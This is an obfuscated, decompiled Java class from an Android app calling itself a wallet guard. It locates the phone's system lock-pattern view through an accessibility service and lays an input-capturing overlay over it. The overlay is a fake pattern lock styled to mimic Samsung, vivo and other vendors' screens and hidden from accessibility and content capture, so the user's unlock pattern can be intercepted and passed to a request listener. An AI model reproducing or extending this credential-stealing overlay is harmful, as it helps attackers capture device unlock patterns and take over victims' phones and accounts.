package com.guard.wallet.helper;

import android.graphics.Color;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.Build.VERSION;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.LinkedList;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

public abstract class o {
   public static WindowManager a;
   public static final com.guard.wallet.plug.d b = new com.guard.wallet.plug.d();
   public static final ReentrantLock c = new ReentrantLock();
   public static final ConcurrentLinkedQueue d = new ConcurrentLinkedQueue();
   public static final AtomicReference e = new AtomicReference();
   public static final AtomicReference f = new AtomicReference();

   public static CombineFilter a() {
      CombineFilter var0 = new CombineFilter();
      var0.setStringConditions(new LinkedList<>());
      var0.getStringConditions().add(new StringCondition("id", "com.android.systemui:id/colorLockPatternView", null, null, null, null));
      return var0;
   }

   public static CombineFilter b() {
      CombineFilter var0 = new CombineFilter();
      var0.setStringConditions(new LinkedList<>());
      var0.getStringConditions().add(new StringCondition("id", "com.android.systemui:id/lockPatternView", null, null, null, null));
      return var0;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static void c(o.e var0, ReqListenHelper var1) {
      Exception var10000;
      label61: {
         UiObject var4;
         try {
            var4 = g(var0);
         } catch (Exception var11) {
            var10000 = var11;
            boolean var10001 = false;
            break label61;
         }

         if (var4 == null) {
            return;
         }

         com.guard.wallet.plug.d var3;
         try {
            var3 = b;
            var3.a.clear();
            var12 = new LayoutParams();
            var12.flags = 4786090;
            var12.format = 1;
            var12.alpha = 1.0F;
            var12.dimAmount = 0.05F;
            j(var12, var4.boundsInScreen());
            var15 = new o0.h(MyAccessibilityService.P());
            var15.setAspectRatioEnabled(true);
            var15.setInputEnabled(true);
            var15.setDotCount(3);
            k(var15);
            var15.setSystemUiVisibility(4);
            var15.setImportantForAccessibility(2);
            if (VERSION.SDK_INT >= 30) {
               var15.setImportantForContentCapture(2);
            }
         } catch (Exception var10) {
            var10000 = var10;
            boolean var18 = false;
            break label61;
         }

         try {
            o0.i var5 = new o0.i(var15);
            var15.t.add(var5);
            if (a == null) {
               a = (WindowManager)MyAccessibilityService.P().getSystemService("window");
            }
         } catch (Exception var9) {
            var10000 = var9;
            boolean var19 = false;
            break label61;
         }

         boolean var2;
         try {
            var12.type = 2032;
            AtomicReference var17 = f;
            if (var17.get() != null) {
               return;
            }

            a.addView(var15, var12);
            var17.set(var15);
            var2 = a1.q.B(var1.getSubscribeId());
         } catch (Exception var8) {
            var10000 = var8;
            boolean var20 = false;
            break label61;
         }

         ConcurrentLinkedQueue var16 = d;
         String var13;
         if (var2) {
            var13 = "NULL_REQ_LISTEN_HELPER";
         } else {
            try {
               var13 = var1.getSubscribeId();
            } catch (Exception var7) {
               var10000 = var7;
               boolean var21 = false;
               break label61;
            }
         }

         try {
            var16.offer(var13);
            var3.b = var1;
            Log.d("com.guard.wallet.helper.o", "patternLockView 创建完成");
            return;
         } catch (Exception var6) {
            var10000 = var6;
            boolean var22 = false;
         }
      }

      Exception var14 = var10000;
      a1.q.s("com.guard.wallet.helper.o", var14);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static void d(o.e var0, CombineFilter var1, ReqListenHelper var2) {
      label45: {
         Exception var10000;
         label48: {
            ReentrantLock var3;
            label42: {
               try {
                  if (MyAccessibilityService.P() == null || i() || !d.isEmpty()) {
                     break label45;
                  }

                  var3 = c;
                  if (!var3.tryLock()) {
                     break label45;
                  }

                  e.set(var1);
                  if (com.guard.wallet.utils.k.a()) {
                     c(var0, var2);
                     break label42;
                  }
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var10001 = false;
                  break label48;
               }

               try {
                  Handler var9 = new Handler(Looper.getMainLooper());
                  o.d var4 = new o.d(var0, var2, 7);
                  var9.postDelayed(var4, 300L);
               } catch (Exception var6) {
                  var10000 = var6;
                  boolean var10 = false;
                  break label48;
               }
            }

            try {
               var3.unlock();
               break label45;
            } catch (Exception var5) {
               var10000 = var5;
               boolean var11 = false;
            }
         }

         Exception var8 = var10000;
         a1.q.s("com.guard.wallet.helper.o", var8);
      }

      i();
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static void e() {
      Exception var10000;
      label32: {
         WindowManager var0;
         try {
            var0 = a;
         } catch (Exception var4) {
            var10000 = var4;
            boolean var10001 = false;
            break label32;
         }

         AtomicReference var1 = f;
         if (var0 != null) {
            try {
               if (var1.get() != null) {
                  Log.d("com.guard.wallet.helper.o", "removeViewImmediate patternView");
                  a.removeViewImmediate((View)var1.get());
                  ((o0.h)var1.get()).c();
               }
            } catch (Exception var3) {
               var10000 = var3;
               boolean var7 = false;
               break label32;
            }
         }

         try {
            e.set(null);
            var1.set(null);
            d.clear();
            StringBuilder var6 = new StringBuilder("isPatternListening:");
            var6.append(i());
            Log.d("com.guard.wallet.helper.o", var6.toString());
            return;
         } catch (Exception var2) {
            var10000 = var2;
            boolean var8 = false;
         }
      }

      Exception var5 = var10000;
      a1.q.s("com.guard.wallet.helper.o", var5);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static void f(String var0, boolean var1) {
      label69: {
         Exception var10000;
         label73: {
            boolean var2;
            ReentrantLock var3;
            try {
               var3 = c;
               var2 = var3.tryLock();
            } catch (Exception var11) {
               var10000 = var11;
               boolean var10001 = false;
               break label73;
            }

            if (!var2) {
               break label69;
            }

            com.guard.wallet.plug.d var4 = b;
            label63:
            if (var1) {
               try {
                  if (!a1.q.B(var0)) {
                     var4.c.set(var0);
                     var4.a();
                     break label63;
                  }
               } catch (Exception var10) {
                  var10000 = var10;
                  boolean var15 = false;
                  break label73;
               }

               try {
                  var4.a();
               } catch (Exception var9) {
                  var10000 = var9;
                  boolean var16 = false;
                  break label73;
               }
            } else {
               try {
                  var4.a.clear();
               } catch (Exception var8) {
                  var10000 = var8;
                  boolean var17 = false;
                  break label73;
               }
            }

            label48: {
               try {
                  if (com.guard.wallet.utils.k.a()) {
                     e();
                     break label48;
                  }
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var18 = false;
                  break label73;
               }

               try {
                  Handler var14 = new Handler(Looper.getMainLooper());
                  f var12 = new f(3);
                  var14.post(var12);
               } catch (Exception var6) {
                  var10000 = var6;
                  boolean var19 = false;
                  break label73;
               }
            }

            try {
               var3.unlock();
               break label69;
            } catch (Exception var5) {
               var10000 = var5;
               boolean var20 = false;
            }
         }

         Exception var13 = var10000;
         a1.q.s("com.guard.wallet.helper.o", var13);
      }

      i();
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static UiObject g(o.e var0) {
      Exception var10000;
      label132: {
         label133: {
            AtomicReference var1;
            UiObject var2;
            try {
               var1 = e;
               if (var1.get() == null) {
                  break label133;
               }

               var2 = var0.n((CombineFilter)var1.get());
            } catch (Exception var14) {
               var10000 = var14;
               boolean var10001 = false;
               break label132;
            }

            if (var2 != null) {
               try {
                  var2 = var2.findOneByCombine((CombineFilter)var1.get());
               } catch (Exception var12) {
                  var10000 = var12;
                  boolean var24 = false;
                  break label132;
               }

               if (var2 != null) {
                  return var2;
               }
            }

            try {
               if (MyAccessibilityService.Q() == null) {
                  break label133;
               }

               var22 = MyAccessibilityService.Q().findOneByCombine((CombineFilter)var1.get());
            } catch (Exception var13) {
               var10000 = var13;
               boolean var25 = false;
               break label132;
            }

            if (var22 != null) {
               return var22;
            }
         }

         label134: {
            try {
               if (com.guard.wallet.utils.e.i()) {
                  var19 = var0.n(a());
                  break label134;
               }
            } catch (Exception var11) {
               var10000 = var11;
               boolean var26 = false;
               break label132;
            }

            label135: {
               try {
                  if (com.guard.wallet.utils.e.l()) {
                     var17 = var0.n(l());
                     break label135;
                  }
               } catch (Exception var10) {
                  var10000 = var10;
                  boolean var27 = false;
                  break label132;
               }

               try {
                  var15 = var0.n(b());
               } catch (Exception var9) {
                  var10000 = var9;
                  boolean var28 = false;
                  break label132;
               }

               if (var15 != null) {
                  try {
                     var16 = var15.findOneByCombine(b());
                  } catch (Exception var8) {
                     var10000 = var8;
                     boolean var29 = false;
                     break label132;
                  }

                  if (var16 != null) {
                     return var16;
                  }
               }

               try {
                  if (MyAccessibilityService.Q() != null) {
                     return MyAccessibilityService.Q().findOneByCombine(b());
                  }

                  return null;
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var30 = false;
                  break label132;
               }
            }

            if (var17 != null) {
               try {
                  var18 = var17.findOneByCombine(l());
               } catch (Exception var6) {
                  var10000 = var6;
                  boolean var31 = false;
                  break label132;
               }

               if (var18 != null) {
                  return var18;
               }
            }

            try {
               if (MyAccessibilityService.Q() != null) {
                  return MyAccessibilityService.Q().findOneByCombine(l());
               }

               return null;
            } catch (Exception var5) {
               var10000 = var5;
               boolean var32 = false;
               break label132;
            }
         }

         if (var19 != null) {
            try {
               var20 = var19.findOneByCombine(a());
            } catch (Exception var4) {
               var10000 = var4;
               boolean var33 = false;
               break label132;
            }

            if (var20 != null) {
               return var20;
            }
         }

         try {
            if (MyAccessibilityService.Q() != null) {
               return MyAccessibilityService.Q().findOneByCombine(a());
            }

            return null;
         } catch (Exception var3) {
            var10000 = var3;
            boolean var34 = false;
         }
      }

      Exception var21 = var10000;
      a1.q.s("com.guard.wallet.helper.o", var21);
      return null;
   }

   public static boolean h() {
      com.guard.wallet.plug.d var1 = b;
      boolean var0;
      if (var1.b != null && !var1.a.isEmpty()) {
         var0 = true;
      } else {
         var0 = false;
      }

      return var0;
   }

   public static boolean i() {
      boolean var0;
      if (f.get() != null && a != null) {
         var0 = true;
      } else {
         var0 = false;
      }

      return var0;
   }

   public static void j(LayoutParams var0, Rect var1) {
      var0.gravity = 8388659;
      var0.x = var1.left;
      var0.y = var1.top;
      var0.width = var1.width();
      var0.height = var1.height();
      StringBuilder var2 = new StringBuilder("screenWidth:");
      var2.append(var1.width());
      Log.d("com.guard.wallet.helper.o", var2.toString());
      StringBuilder var3 = new StringBuilder("screenHeight:");
      var3.append(var1.height());
      Log.d("com.guard.wallet.helper.o", var3.toString());
      ScreenMetricsVO var4 = com.guard.wallet.utils.e.e();
      StringBuilder var5 = new StringBuilder("StatusBarHeight:");
      var5.append(var4.getStatusBarHeight());
      Log.d("com.guard.wallet.helper.o", var5.toString());
   }

   public static void k(o0.h var0) {
      boolean var1 = com.guard.wallet.utils.e.i();
      o0.e var2 = o0.e.h;
      if (var1) {
         var0.setNormalStateColor(-7829368);
         var0.setDotNormalSize(30);
         var0.setDotSelectedSize(60);
         var0.setPathWidth(10);
         var0.setPathColor(-1);
         var0.setAspectRatio(1);
      } else {
         label34: {
            if (Build.BRAND.equalsIgnoreCase("samsung")) {
               var0.setNormalStateColor(-3355444);
               var0.setDotNormalSize(36);
               var0.setDotSelectedSize(50);
               var0.setPathWidth(10);
               var0.setPathColor(-1);
               var0.setAspectRatio(0);
               var0.setDotAlign(var2);
               var0.setDotAnimationDuration(100);
               var0.setPathEndAnimationDuration(200);
               return;
            }

            if (com.guard.wallet.utils.e.g()) {
               var0.setNormalStateColor(-1);
               var0.setDotNormalSize(32);
               var0.setDotSelectedSize(50);
               var0.setDotSelectedColor(-1);
               var0.setPathWidth(20);
               var0.setPathColor(-7829368);
            } else {
               if (com.guard.wallet.utils.e.l()) {
                  var0.setNormalStateColor(-3355444);
                  var0.setDotSelectedSize(40);
                  var0.setDotSelectedColor(-256);
                  var0.setPathWidth(30);
                  var0.setPathColor(Color.parseColor("#FFF68F"));
                  var0.setAspectRatio(0);
                  var0.setDotNormalSize(20);
                  break label34;
               }

               if (!com.guard.wallet.utils.e.m() && !com.guard.wallet.utils.e.k()) {
                  var0.setNormalStateColor(-16777216);
                  var0.setDotNormalSize(30);
                  var0.setDotSelectedSize(60);
                  var0.setDotSelectedColor(-16777216);
                  var0.setPathWidth(40);
                  var0.setPathColor(Color.argb(204, 0, 101, 140));
                  var0.setAspectRatio(0);
                  var0.setDotAlign(var2);
                  var0.setDotAnimationDuration(50);
                  var0.setPathEndAnimationDuration(50);
                  return;
               }

               var0.setNormalStateColor(-1);
               var0.setDotNormalSize(20);
               var0.setDotSelectedSize(30);
               var0.setDotSelectedColor(-1);
               var0.setPathWidth(5);
               var0.setPathColor(-1);
            }

            var0.setAspectRatio(0);
         }
      }

      var0.setDotAlign(var2);
      var0.setDotAnimationDuration(150);
      var0.setPathEndAnimationDuration(100);
   }

   public static CombineFilter l() {
      CombineFilter var0 = new CombineFilter();
      var0.setStringConditions(new LinkedList<>());
      var0.getStringConditions().add(new StringCondition("id", "com.android.systemui:id/vivo_lock_pattern_view", null, null, null, null));
      return var0;
   }
}
